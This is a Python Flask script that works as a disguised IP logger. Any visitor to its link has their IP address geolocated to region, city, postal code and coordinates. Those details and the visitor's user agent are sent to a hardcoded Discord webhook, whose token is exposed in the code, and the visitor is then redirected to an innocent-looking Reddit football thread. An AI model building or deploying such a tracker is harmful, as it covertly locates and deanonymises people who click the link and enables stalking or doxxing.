from flask import Flask, request, redirect
import requests
import json
import datetime
import os

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def get_visitor_info(ip, user_agent):
    try:
        ipapi_url = f"https://ipapi.co/{ip}/json/"
        resp = requests.get(ipapi_url, timeout=5)
        if resp.status_code != 200:
            return None
        details = resp.json()

        return {
            "ip": ip,
            "user_agent": user_agent[:256],  # limit user agent length
            "country": details.get("country_name", "Unknown"),
            "countryCode": details.get("country_code", "xx").lower(),
            "region": details.get("region", ""),
            "city": details.get("city", ""),
            "zip": details.get("postal", ""),
            "lat": details.get("latitude", 0),
            "lon": details.get("longitude", 0),
            "date": datetime.datetime.utcnow().strftime("%d/%m/%Y"),
            "time": datetime.datetime.utcnow().strftime("%H:%M:%S"),
        }
    except Exception as e:
        print(f"Error in get_visitor_info: {e}")
        return None

def send_to_discord(info):
    if not info:
        return

    try:
        flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"

        embed = {
            "username": "hexdzt",
            "avatar_url": "https://i.imgur.com/7GwrH0B.png",  # your bot avatar URL
            "embeds": [{
                "title": f"Visitor from {info['country']}",
                "color": 0x3498db,
                "fields": [
                    {"name": "IP Address", "value": info['ip'], "inline": True},
                    {"name": "Location", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
                    {"name": "Coordinates", "value": f"[Google Maps](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']})"},
                    {"name": "User Agent", "value": info['user_agent']}
                ],
                "footer": {
                    "text": f"Date: {info['date']} Time: {info['time']}",
                    "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                },
                "thumbnail": {"url": flag_url}
            }]
        }

        headers = {"Content-Type": "application/json"}
        response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, data=json.dumps(embed))
        if response.status_code != 204:
            print(f"Failed to send webhook: {response.status_code} {response.text}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Unknown')

    if not ip or ip.startswith('127.') or ip == '::1':
        # Just redirect anyway for localhost
        return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

    info = get_visitor_info(ip, user_agent)
    if info:
        send_to_discord(info)

    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
